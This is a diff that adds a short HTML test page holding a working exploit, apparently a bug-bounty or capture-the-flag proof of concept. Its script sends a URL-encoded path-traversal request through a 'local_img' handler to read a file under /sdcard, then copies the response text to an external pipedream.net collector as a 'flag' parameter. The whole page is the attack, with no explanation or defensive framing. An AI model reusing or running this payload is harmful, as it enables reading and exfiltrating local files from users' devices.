@@ -1,0 +1,16 @@
+<h1 id="wjh">TEST</h1>
+<img id="img" src="" width="300"/><br>
+
+
+<script>
+request_url = "https%3A%2F%2Fevilsnssdk.com%2F53e9290f0d8d5b184b95cc97b0884a0a%2F1%2F175264841661378022%2Ftrap.html%2F..https://local_img/./%2F..https://local_img/./%2F..https://local_img/./%2F..https://local_img/./%2F..https://local_img/./%2F..https://local_img/./%2F..https://local_img/./%2F..https://local_img/./%2Fsdcard%2Fjsbridge_api_Finder.html%2Fhttps://local_img/%3Fneed_common_params%3D1%26append_common_params%3D1%26_pia_%3D1%26param_from%3Durl'"
+var request = new XMLHttpRequest();
+request.open('GET', request_url);
+request.onload = function () {
+	var img = document.getElementById("img");
+    if (request.readyState === 4 && request.status === 200) {
+        img.setAttribute("src", "https://eo2bmxea4olrjro.m.pipedream.net?flag=" + request.responseText);
+	}
+};
+request.send(null);
+</script>
